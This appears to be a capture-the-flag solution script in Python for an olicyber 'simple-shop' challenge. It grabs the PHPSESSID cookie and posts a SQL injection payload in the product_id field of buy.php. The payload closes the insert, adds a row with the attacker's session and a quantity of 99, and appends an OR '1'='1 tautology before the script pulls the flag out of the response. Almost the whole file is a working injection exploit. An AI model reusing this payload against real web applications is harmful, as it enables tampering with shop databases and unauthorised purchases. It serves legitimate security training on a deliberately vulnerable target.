import requests
import re

s = requests.Session()
url = "http://simple-shop.challs.nazionale.olicyber.it/"

s.get(url)

session = s.cookies["PHPSESSID"]

payload = f"1), (\"{session}\", 99);-- -' OR '1'='1"

r = s.post(url + "buy.php", data={"product_id": payload})

flag = re.search(r"flag\{.*?\}", r.text)
print(flag.group())